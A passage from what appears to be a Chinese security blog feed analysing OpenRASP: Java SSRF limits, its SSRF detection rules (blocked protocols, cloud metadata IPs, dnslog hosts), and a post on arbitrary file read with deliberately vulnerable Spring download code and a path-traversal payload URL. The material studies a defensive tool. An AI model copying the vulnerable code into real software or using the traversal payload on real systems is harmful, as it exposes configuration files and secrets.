class="type">double</span>        <span class="type">double</span>-precision floating-point value</span><br><span class="line">F             <span class="type">float</span>         single-precision floating-point value</span><br><span class="line">I             <span class="type">int</span>           integer</span><br><span class="line">J             <span class="type">long</span>          <span class="type">long</span> integer</span><br><span class="line">L&lt;classname&gt;; reference     an instance of class    <span class="comment">//引用类</span></span><br><span class="line">S             <span class="type">short</span>         signed <span class="type">short</span></span><br><span class="line">Z             <span class="type">boolean</span>       <span class="literal">true</span> or <span class="literal">false</span></span><br><span class="line">[             reference     one array dimension<span class="comment">//数组</span></span><br></pre></td></tr></table></figure><p>​疑问：如何将jar放入另一个项目源码中调试，比如IDEA打开OpenRASP项目源码，配置远程调试，此时还希望同时调试SpringBoot项目的源码，是将springboot项目.jar放入OpenRASP项目吗？没有找到合适的方法。是否可以学导入OpenRASP-v8那样，将springboot项目.jar放到mvn路径里。</p><h2 id="Java中SSRF的限制"><a href="#Java中SSRF的限制" class="headerlink" title="Java中SSRF的限制"></a>Java中SSRF的限制</h2><p>​Java中SSRF仅支持 sun.net.<a href="http://www.protocol/">www.protocol</a> 下的所有协议：http、https、file、ftp、mailto、jar和netdoc协议，可以通过file协议或netdoc协议列出目录，读取敏感文件，无回显时可通过ftp协议进行带外读取，可以通过http协议探测端口是否启用，但是，不能通过gopher协议拓展供给面，因为不支持该协议。</p><p>​此外，在“302重定向SSRF”攻击中，要求传入的url协议必须和重定向的url协议一致，重定向url协议也受上述限制。</p><h2 id="SSRF检测算法"><a href="#SSRF检测算法" class="headerlink" title="SSRF检测算法"></a>SSRF检测算法</h2><p>1.控制变量</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SSRF - 来自用户输入，且为内网地址就拦截</span></span><br><span class="line"><span class="attr">ssrf_userinput</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>:   <span class="string">&#x27;算法1 - 用户输入匹配算法（支持 rebind 检测）&#x27;</span>,</span><br><span class="line">    <span class="attr">action</span>: <span class="string">&#x27;block&#x27;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// SSRF - 是否允许访问 aws metadata</span></span><br><span class="line"><span class="attr">ssrf_aws</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>:   <span class="string">&#x27;算法2 - 拦截 AWS/Aliyun/GCP metadata 访问&#x27;</span>,</span><br><span class="line">    <span class="attr">action</span>: <span class="string">&#x27;block&#x27;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// SSRF - 是否允许访问 dnslog 地址</span></span><br><span class="line"><span class="attr">ssrf_common</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>:    <span class="string">&#x27;算法3 - 拦截常见 dnslog 地址&#x27;</span>,</span><br><span class="line">    <span class="attr">action</span>:  <span class="string">&#x27;block&#x27;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// SSRF - 是否允许访问混淆后的IP地址</span></span><br><span class="line"><span class="attr">ssrf_obfuscate</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>:   <span class="string">&#x27;算法4 - 拦截混淆地址&#x27;</span>,</span><br><span class="line">    <span class="attr">action</span>: <span class="string">&#x27;ignore&#x27;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// SSRF - 禁止使用 curl 读取 file:///etc/passwd、php://filter/XXXX 这样的内容</span></span><br><span class="line"><span class="attr">ssrf_protocol</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>:      <span class="string">&#x27;算法5 - 拦截 php:// 等异常协议&#x27;</span>,</span><br><span class="line">    <span class="attr">action</span>:    <span class="string">&#x27;block&#x27;</span>,</span><br><span class="line">    <span class="attr">protocols</span>: [</span><br><span class="line">        <span class="string">&#x27;file&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;gopher&#x27;</span>,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// python specific</span></span><br><span class="line">        <span class="string">&#x27;local_file&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;local-file&#x27;</span>,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// java specific</span></span><br><span class="line">        <span class="string">&#x27;jar&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;netdoc&#x27;</span>,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// php specific</span></span><br><span class="line">        <span class="string">&#x27;dict&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;phar&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;compress.zlib&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;compress.bzip2&#x27;</span></span><br><span class="line">    ]</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>2.匹配规则和返回内容</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">check_internal_ip</span>(<span class="params">ip, origin_ip</span>) &#123;</span><br><span class="line">    <span class="comment">// origin_ip不为空且全部为内网地址则跳过</span></span><br><span class="line">    <span class="keyword">if</span> (origin_ip &amp;&amp; origin_ip.<span class="title function_">every</span>(<span class="keyword">function</span>(<span class="params">value</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> internalRegex.<span class="title function_">test</span>(value)</span><br><span class="line">        &#125;))&#123; <span class="keyword">return</span> &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;ip.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (internalRegex.<span class="title function_">test</span>(ip[i]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="attr">action</span>:     algorithmConfig.<span class="property">ssrf_userinput</span>.<span class="property">action</span>,</span><br><span class="line">                <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;SSRF - Requesting intranet address: %1%&quot;</span>, [ ip[i] ]),</span><br><span class="line">                <span class="attr">confidence</span>: <span class="number">100</span>,</span><br><span class="line">                <span class="attr">algorithm</span>:  <span class="string">&#x27;ssrf_userinput&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">check_internal_hostname</span>(<span class="params">hostname, origin_hostname</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> ((origin_hostname) &amp;&amp; (origin_hostname == <span class="string">&#x27;[::]&#x27;</span> || origin_hostname == <span class="string">&#x27;[::1]&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (hostname == <span class="string">&#x27;[::]&#x27;</span> || hostname == <span class="string">&#x27;[::1]&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">action</span>:     algorithmConfig.<span class="property">ssrf_userinput</span>.<span class="property">action</span>,</span><br><span class="line">            <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;SSRF - Requesting intranet address: %1%&quot;</span>, [ hostname ]),</span><br><span class="line">            <span class="attr">confidence</span>: <span class="number">100</span>,</span><br><span class="line">            <span class="attr">algorithm</span>:  <span class="string">&#x27;ssrf_userinput&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">check_internal</span>(<span class="params">params, context, is_redirect</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> ret</span><br><span class="line">    <span class="keyword">var</span> all_parameter = <span class="title function_">get_all_parameter</span>(context)</span><br><span class="line">    <span class="keyword">if</span> (is_redirect) &#123;</span><br><span class="line">        ret = <span class="title function_">check_internal_ip</span>(params.<span class="property">ip</span>, params.<span class="property">origin_ip</span>)</span><br><span class="line">        <span class="keyword">if</span> (ret &amp;&amp; !whiteHostName.<span class="title function_">test</span>(params.<span class="property">hostname</span>)) &#123;<span class="keyword">return</span> ret&#125;</span><br><span class="line">        ret = <span class="title function_">check_internal_hostname</span>(params.<span class="property">hostname</span>, params.<span class="property">origin_hostname</span>)</span><br><span class="line">        <span class="keyword">if</span> (ret) &#123;<span class="keyword">return</span> ret&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_">is_from_userinput</span>(all_parameter, params.<span class="property">url</span>)) &#123;</span><br><span class="line">        <span class="comment">// 非重定向，判定用户输入</span></span><br><span class="line">        ret = <span class="title function_">check_internal_ip</span>(params.<span class="property">ip</span>, <span class="literal">undefined</span>)</span><br><span class="line">        <span class="keyword">if</span> (ret &amp;&amp; !whiteHostName.<span class="title function_">test</span>(params.<span class="property">hostname</span>)) &#123;<span class="keyword">return</span> ret&#125;</span><br><span class="line">        ret = <span class="title function_">check_internal_hostname</span>(params.<span class="property">hostname</span>, <span class="literal">undefined</span>)</span><br><span class="line">        <span class="keyword">if</span> (ret) &#123;<span class="keyword">return</span> ret&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">check_ssrf</span>(<span class="params">params, context, is_redirect</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> hostname  = params.<span class="property">hostname</span></span><br><span class="line">    <span class="keyword">var</span> url       = params.<span class="property">url</span></span><br><span class="line">    <span class="keyword">var</span> ip        = params.<span class="property">ip</span></span><br><span class="line">    <span class="keyword">var</span> reason    = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 算法1 - 当参数来自用户输入，且为内网IP，判定为SSRF攻击</span></span><br><span class="line">    <span class="keyword">if</span> (algorithmConfig.<span class="property">ssrf_userinput</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> ret</span><br><span class="line">        ret = <span class="title function_">check_internal</span>(params, context, is_redirect)</span><br><span class="line">        <span class="comment">// 过滤非HTTP请求（dubbo)</span></span><br><span class="line">        <span class="keyword">var</span> header = context.<span class="property">header</span> || &#123;&#125;</span><br><span class="line">        <span class="keyword">if</span> (ret &amp;&amp; <span class="title class_">Object</span>.<span class="title function_">keys</span>(header).<span class="property">length</span> != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ret</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 算法2 - 检查常见探测域名</span></span><br><span class="line">    <span class="keyword">if</span> (algorithmConfig.<span class="property">ssrf_common</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">is_hostname_dnslog</span>(hostname) || [<span class="string">&#x27;requestb.in&#x27;</span>, <span class="string">&#x27;transfer.sh&#x27;</span>].<span class="title function_">includes</span>(hostname.<span class="title function_">toLowerCase</span>()))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="attr">action</span>:     algorithmConfig.<span class="property">ssrf_common</span>.<span class="property">action</span>,</span><br><span class="line">                <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;SSRF - Requesting known DNSLOG address: %1%&quot;</span>, [hostname]),</span><br><span class="line">                <span class="attr">confidence</span>: <span class="number">100</span>,</span><br><span class="line">                <span class="attr">algorithm</span>:  <span class="string">&#x27;ssrf_common&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 算法3 - 检测 AWS/Aliyun/GoogleCloud 私有地址: 拦截IP访问、绑定域名访问两种方式</span></span><br><span class="line">    <span class="keyword">if</span> (algorithmConfig.<span class="property">ssrf_aws</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (ip == <span class="string">&#x27;169.254.169.254&#x27;</span> || ip == <span class="string">&#x27;100.100.100.200&#x27;</span> || ip == <span class="string">&#x27;168.63.129.16&#x27;</span></span><br><span class="line">            || hostname == <span class="string">&#x27;169.254.169.254&#x27;</span> || hostname == <span class="string">&#x27;100.100.100.200&#x27;</span> || hostname == <span class="string">&#x27;168.63.129.16&#x27;</span></span><br><span class="line">            || hostname == <span class="string">&#x27;metadata.google.internal&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="attr">action</span>:     algorithmConfig.<span class="property">ssrf_aws</span>.<span class="property">action</span>,</span><br><span class="line">                <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;SSRF - Requesting AWS metadata address&quot;</span>),</span><br><span class="line">                <span class="attr">confidence</span>: <span class="number">100</span>,</span><br><span class="line">                <span class="attr">algorithm</span>:  <span class="string">&#x27;ssrf_aws&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 算法4 - ssrf_obfuscate</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 检查混淆:</span></span><br><span class="line">    <span class="comment">// http://2130706433</span></span><br><span class="line">    <span class="comment">// http://0x7f001</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 以下混淆方式没有检测，容易误报</span></span><br><span class="line">    <span class="comment">// http://0x7f.0x0.0x0.0x1</span></span><br><span class="line">    <span class="comment">// http://0x7f.0.0.0</span></span><br><span class="line">    <span class="keyword">if</span> (algorithmConfig.<span class="property">ssrf_obfuscate</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> reason = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">isNaN</span>(hostname) &amp;&amp; hostname.<span class="property">length</span> != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            reason = <span class="title function_">_</span>(<span class="string">&quot;SSRF - Requesting numeric IP address: %1%&quot;</span>, [hostname])</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// else if (hostname.startsWith(&#x27;0x&#x27;) &amp;&amp; hostname.indexOf(&#x27;.&#x27;) === -1)</span></span><br><span class="line">        <span class="comment">// &#123;</span></span><br><span class="line">        <span class="comment">//     reason = _(&quot;SSRF - Requesting hexadecimal IP address: %1%&quot;, [hostname])</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (reason)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="attr">action</span>:     algorithmConfig.<span class="property">ssrf_obfuscate</span>.<span class="property">action</span>,</span><br><span class="line">                <span class="attr">message</span>:    reason,</span><br><span class="line">                <span class="attr">confidence</span>: <span class="number">100</span>,</span><br><span class="line">                <span class="attr">algorithm</span>:  <span class="string">&#x27;ssrf_obfuscate&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 算法5 - 特殊协议检查</span></span><br><span class="line">    <span class="keyword">if</span> (algorithmConfig.<span class="property">ssrf_protocol</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 获取协议</span></span><br><span class="line">        <span class="keyword">var</span> proto = url.<span class="title function_">split</span>(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>].<span class="title function_">toLowerCase</span>()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (algorithmConfig.<span class="property">ssrf_protocol</span>.<span class="property">protocols</span>.<span class="title function_">indexOf</span>(proto) != -<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="attr">action</span>:     algorithmConfig.<span class="property">ssrf_protocol</span>.<span class="property">action</span>,</span><br><span class="line">                <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;SSRF - Using dangerous protocol: %1%://&quot;</span>, [proto]),</span><br><span class="line">                <span class="attr">confidence</span>: <span class="number">100</span>,</span><br><span class="line">                <span class="attr">algorithm</span>:  <span class="string">&#x27;ssrf_protocol&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.正则表达式</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 匹配内网地址</span></span><br><span class="line"><span class="keyword">var</span> internalRegex   = <span class="regexp">/^(0\.0\.0|127|10|192\.168|172\.(1[6-9]|2[0-9]|3[01]))\./</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ssrf白名单主机名</span></span><br><span class="line"><span class="keyword">var</span> whiteHostName   = <span class="regexp">/\.bcebos\.com$|(^|\.)oss-[\d\w\-]&#123;0,30&#125;\.aliyuncs\.com$/</span></span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>《Java代码审计-入门篇》和《Java代码审计实战》</span><br><span class="line"><span class="number">2.</span>官方文档 Hook函数列表 和 功能说明</span><br><span class="line">https:<span class="comment">//rasp.baidu.com/doc/hacking/architect/hook.html</span></span><br><span class="line">https:<span class="comment">//rasp.baidu.com/doc/usage/main.html</span></span><br><span class="line"><span class="number">3.</span>一个支持<span class="number">302</span>跳转的py脚本</span><br><span class="line">https:<span class="comment">//www.cnblogs.com/zpchcbd/p/14993777.html</span></span><br><span class="line"><span class="number">4.</span>Java Sec Code靶场</span><br><span class="line">https:<span class="comment">//github.com/JoyChou93/java-sec-code</span></span><br><span class="line"><span class="number">5.</span>SSRF in Java</span><br><span class="line">https:<span class="comment">//xz.aliyun.com/t/206</span></span><br><span class="line"><span class="number">6.</span>gopher 协议在SSRF中的一些利用</span><br><span class="line">https:<span class="comment">//xz.aliyun.com/t/6993</span></span><br><span class="line"><span class="number">7.</span>Just Gopher It：以 <span class="number">1.5</span> 万美元的价格将盲目SSRF升级为 RCE — Yahoo Mail</span><br><span class="line">https:<span class="comment">//sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OpenRASP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenRASP文件操作漏洞</title>
      <link href="/2022/12/08/OpenRASP%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/12/08/OpenRASP%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="OpenRASP-文件操作漏洞"><a href="#OpenRASP-文件操作漏洞" class="headerlink" title="OpenRASP-文件操作漏洞"></a>OpenRASP-文件操作漏洞</h1><h2 id="敏感文件下载、任意文件读取"><a href="#敏感文件下载、任意文件读取" class="headerlink" title="敏感文件下载、任意文件读取"></a>敏感文件下载、任意文件读取</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>​在文件上传中我们通常用到的是FileOutputStream，而在文件下载中，我们用到的通常是FileInputStream，引发任意文件下载&#x2F;读取漏洞的原因通常是对传入的路径未作严格的校验，导致攻击者可以自定义路径，从而达到任意文件下载&#x2F;读取的效果。</p><h3 id="业务代码"><a href="#业务代码" class="headerlink" title="业务代码"></a>业务代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//项目通过jar包部署时，因为tomcat内嵌到jar包，这时会把项目放在系统临时文件中。</span></span><br><span class="line"><span class="comment">//像application.getResource(&quot;/&quot;).getPath()，这样获取到的是：C:\Users\bmsk\AppData\Local\Temp\tomcatdocbase.8787.8355814635775952653\download，这种位置是没法找到的。</span></span><br><span class="line"><span class="comment">//解决的办法是注入绝对路径：</span></span><br><span class="line"><span class="comment">//配置文件</span></span><br><span class="line">file.download.dir= D:\\javaProject\\testRASP\\src\\main\\webapp\\reports</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="comment">//前端</span></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;测试文件下载&lt;/h1&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;download&quot;</span>&gt;</span><br><span class="line">        &lt;input name=<span class="string">&quot;fileName&quot;</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="comment">//后端</span></span><br><span class="line"><span class="meta">@Value(&quot;$&#123;file.download.dir&#125;&quot;)</span></span><br><span class="line"><span class="keyword">private</span> String downloadPath;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping(&quot;download&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">download</span><span class="params">(String fileName, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">//1.去指定目录中读取文件</span></span><br><span class="line">    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(downloadPath,fileName);</span><br><span class="line">    <span class="comment">//2.将文件读取为文件输入流</span></span><br><span class="line">    <span class="type">FileInputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">    <span class="comment">//2.5 获取响应流之前，指定以附件的形式下载，而不是展示到web页面</span></span><br><span class="line">    response.setHeader(<span class="string">&quot;content-disposition&quot;</span>,<span class="string">&quot;attachment;fileName=&quot;</span>+fileName);</span><br><span class="line">    <span class="comment">//3.获取相应输出流</span></span><br><span class="line">    <span class="type">ServletOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> response.getOutputStream();</span><br><span class="line">    <span class="comment">//4.将输入流复制到输出流</span></span><br><span class="line">    <span class="type">int</span> len=<span class="number">0</span>;</span><br><span class="line">    <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">        len = is.read(b);</span><br><span class="line">        <span class="keyword">if</span>(len==-<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        os.write(b,<span class="number">0</span>,len);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//5.释放资源</span></span><br><span class="line">    is.close();</span><br><span class="line">    <span class="comment">// //第4、5步骤的简化，因为该工具类操作完文件后会关闭流，所以不用再释放；该工具类位于org.springframework.util</span></span><br><span class="line">    <span class="comment">// FileCopyUtils.copy(is,os);</span></span><br><span class="line">&#125;   </span><br><span class="line">------------------------------------------------------------------------   </span><br><span class="line"><span class="comment">//漏洞payload</span></span><br><span class="line">http:<span class="comment">//127.0.0.1:8083/download?filename=../../resources/application.properties</span></span><br></pre></td></tr></table></figure><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><ul><li>可以将下载文件的路径和名称存储在数据库中或者对应编号，当有用户请求下载时，直接接受其传入的编号或名称，然后调用对应的文件下载即可。</li><li>在生成File文件类之前，开发者应该对用户传入的下载路径进行校验，判断该路径是否位于指定目录下，以及是否允许下载或读取。</li></ul><h3 id="OpenRASP检测流程"><a href="#OpenRASP检测流程" class="headerlink" title="OpenRASP检测流程"></a>OpenRASP检测流程</h3><h4 id="FileInputStreamHook"><a href="#FileInputStreamHook" class="headerlink" title="FileInputStreamHook"></a>FileInputStreamHook</h4><ul><li>应用类：java&#x2F;io&#x2F;FileInputStream</li><li>hook类：FileInputStreamHook</li></ul><p>​将检测代码checkReadFile插入FileInputStream构造函数执行前，将请求文件的相对路径path和绝对路径realpath存储在params，并传递给HookHandler.doCheck进入检测逻辑。任意文件读取漏洞的检测，依然是交给我们熟悉的V8AttackChecker执行流去处理。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(FileInputStreamHook.class, <span class="string">&quot;checkReadFile&quot;</span>, <span class="string">&quot;$1&quot;</span>, File.class);</span><br><span class="line">insertBefore(ctClass.getConstructor(<span class="string">&quot;(Ljava/io/File;)V&quot;</span>), src);</span><br><span class="line">------------------------------------------------------------------------ </span><br><span class="line"><span class="comment">//（位于FileInputStreamHook#checkReadFile方法）</span></span><br><span class="line">HashMap&lt;String, Object&gt; params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">params.put(<span class="string">&quot;path&quot;</span>, file.getPath());</span><br><span class="line">params.put(<span class="string">&quot;realpath&quot;</span>, FileUtil.getRealPath(file));</span><br><span class="line">HookHandler.doCheck(CheckParameter.Type.READFILE, params);</span><br><span class="line">------------------------------------------------------------------------ </span><br><span class="line"><span class="comment">//放入params的内容</span></span><br><span class="line">path: D:\javaProject\testRASP\src\main\webapp\reports\..\..\resources\application.properties</span><br><span class="line">realpath: D:\javaProject\testRASP\src\main\resources\application.properties</span><br><span class="line"><span class="comment">//Stack Frames V8AttackChecker执行流</span></span><br><span class="line">HookHandler.doCheck -&gt; HookHandler.doCheckWithoutRequest -&gt; HookHandler.doRealCheckWithoutRequest</span><br><span class="line">    -&gt; CheckerManager.check -&gt; AbstractChecker.check </span><br><span class="line">    -&gt; V8AttackChecker.checkParam -&gt; JS.Check (内部执行Native方法V8.Check，存储attackInfos)</span><br></pre></td></tr></table></figure><h4 id="FileRandomAccessReadHook"><a href="#FileRandomAccessReadHook" class="headerlink" title="FileRandomAccessReadHook"></a>FileRandomAccessReadHook</h4><ul><li>应用类：java&#x2F;io&#x2F;RandomAccessFile</li><li>hook类：FileRandomAccessReadHook</li></ul><p>​RandomAccessFile是Java 输入&#x2F;输出流体系中功能最丰富的文件内容访问类，支持”随机访问”的方式，程序可以直接跳转到文件的任意地方来读写数据，更详细的介绍及业务代码如下。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//https://blog.csdn.net/qq_40100414/article/details/120179117</span></span><br><span class="line"><span class="comment">//RandomAccessFile允许自由定位文件记录指针，构造器获取文件名或者File，而不是文件流FileInputStream</span></span><br><span class="line"> <span class="type">long</span> <span class="title function_">getFilePointer</span><span class="params">()</span>：返回文件记录指针的当前位置。(<span class="keyword">native</span>方法)</span><br><span class="line"> <span class="keyword">void</span> <span class="title function_">seek</span><span class="params">(<span class="type">long</span> pos)</span>：将文件记录指针定位到pos位置。(调用本地方法seek0)</span><br><span class="line">------------------------------------------------------------------------ </span><br><span class="line"><span class="comment">//业务代码</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;download&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">download</span><span class="params">(String fileName, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">     <span class="type">RandomAccessFile</span> <span class="variable">randomAccessFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(downloadPath+<span class="string">&quot;\\&quot;</span>+fileName, <span class="string">&quot;rw&quot;</span>);</span><br><span class="line">     <span class="type">String</span> <span class="variable">outputStr</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">     <span class="type">ServletOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> response.getOutputStream();</span><br><span class="line">     response.setHeader(<span class="string">&quot;content-disposition&quot;</span>,<span class="string">&quot;attachment;fileName=&quot;</span>+fileName);</span><br><span class="line">     <span class="type">byte</span>[] outputByte = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4096</span>];</span><br><span class="line">     <span class="keyword">while</span> (randomAccessFile.read(outputByte, <span class="number">0</span>, <span class="number">4096</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">         os.write(outputByte,<span class="number">0</span>,<span class="number">4096</span>);</span><br><span class="line">     &#125;</span><br><span class="line">     os.close();</span><br><span class="line">     randomAccessFile.close();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>​将检测代码checkReadFile插入到RandomAccessFile构造函数执行前，该检测代码在传入File实例不为空、不为jar包以及不为war包时，会直接调用前面hook类FileInputStreamHook的检测代码，对传入的File实例进行检测。根据js中的正则表达式规则，OpenRASP对任意文件读取漏洞的防御，在于设置白名单，所以请求..&#x2F;..&#x2F;resources&#x2F;1.txt可通过，请求application.properties则会获得小恐龙。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">readSrc</span> <span class="operator">=</span> getInvokeStaticSrc(FileRandomAccessReadHook.class, <span class="string">&quot;checkReadFile&quot;</span>, <span class="string">&quot;$1&quot;</span>, File.class);</span><br><span 